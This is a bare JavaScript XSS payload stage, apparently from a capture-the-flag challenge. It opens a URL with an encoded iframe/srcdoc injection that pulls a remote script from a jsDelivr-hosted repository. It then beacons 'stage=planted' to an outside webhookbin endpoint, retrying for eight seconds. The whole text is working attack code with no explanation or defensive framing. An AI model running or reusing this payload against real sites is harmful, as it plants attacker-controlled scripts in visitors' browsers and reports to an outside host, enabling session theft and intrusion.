(function(){
  const u = 'http://web:80/?q=%22%3E%3Ciframe%20x%3D%27%20srcdoc%3D%27%26lt%3Bscript%20src%3Dhttps%3A%26%23x2f%3B%26%23x2f%3Bcdn.jsdelivr.net%26%23x2f%3Bgh%26%23x2f%3Blayer7-kr%26%23x2f%3BSSD-CTF-2025-Challenges%40babyxss-codex-20260408%26%23x2f%3Bpayloads%26%23x2f%3Bbabyxss_poll.js%26gt%3B%26lt%3B%26%23x2f%3Bscript%26gt%3B%27%3E';
  let done = false;
  function openIt(){
    if (done) return;
    try {
      const w = top.open(u, 'babyxss_persist');
      if (w) {
        done = true;
        fetch('https://webhookbin.net/v1/bin/0c5eaa51-6cc3-4eca-aa3e-3dc7c76362f0', {
          method: 'POST',
          mode: 'no-cors',
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: 'stage=planted'
        });
      }
    } catch (e) {}
  }
  const t = setInterval(openIt, 500);
  setTimeout(() => clearInterval(t), 8000);
  openIt();
})();
